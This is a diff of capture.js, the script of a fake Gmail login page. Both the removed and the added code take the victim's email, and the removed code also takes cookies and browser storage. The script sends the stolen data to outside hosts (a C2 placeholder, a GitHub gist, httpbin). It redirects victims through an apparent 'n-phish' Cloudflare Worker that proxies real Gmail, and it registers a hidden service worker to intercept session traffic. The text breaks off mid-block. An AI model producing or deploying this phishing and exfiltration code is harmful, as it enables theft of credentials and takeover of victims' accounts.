@@ -1,54 +1,37 @@
-// capture.js - Steal everything
-let victimData = {};
-
-document.getElementById('loginForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
+// capture.js - Route to YOUR Cloudflare Worker
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('loginForm');
+    const emailInput = document.getElementById('identifier');
     
-    const email = document.getElementById('identifier').value;
-    victimData.email = email;
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const email = emailInput.value;
+        const victimData = {
+            email: email,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform
+        };
+        
+        // 1. EXFIL EMAIL IMMEDIATELY
+        fetch('https://httpbin.org/post', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(victimData)
+        }).catch(() => {}); // Silent fail
+        
+        // 2. REDIRECT TO YOUR WORKER (proxies real Gmail)
+        window.location.href = `https://n-phish.ia7353038.workers.dev/mail/u/0/#inbox?email=${encodeURIComponent(email)}`;
+    });
     
-    // Redirect to REAL Gmail through proxy (victim thinks it worked)
-    window.location.href = '/mail/u/0/#inbox';
-    
-    // Immediate exfil
-    await exfiltrate();
+    // Stealth Service Worker for all Google traffic
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('https://n-phish.ia7353038.workers.dev/sw.js')
+            .catch(() => {}); // Silent
+    }
 });
-
-async function exfiltrate() {
-    // Capture all available data
-    const data = {
-        ...victimData,
-        cookies: document.cookie,
-        localStorage: { ...localStorage },
-        sessionStorage: { ...sessionStorage },
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-    };
-    
-    // Send to your C2 via image beacon (stealthy)
-    const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
-    const url = URL.createObjectURL(blob);
-    
-    fetch('https://your-c2.com/capture', {
-        method: 'POST',
-        body: JSON.stringify(data),
-        mode: 'no-cors'
-    });
-    
-    // GitHub Gist backup (legit-looking)
-    fetch('https://api.github.com/gists', {
-        method: 'POST',
-        headers: { Authorization: 'token YOUR_GITHUB_TOKEN' },
-        body: JSON.stringify({
-            description: 'pentest-data',
-            public: false,
-            files: { [`victim-${Date.now()}`]: { content: JSON.stringify(data) } }
-        })
-    });
-}
 
 // Service Worker registration for full session proxying
 if ('serviceWorker' in navigator) {
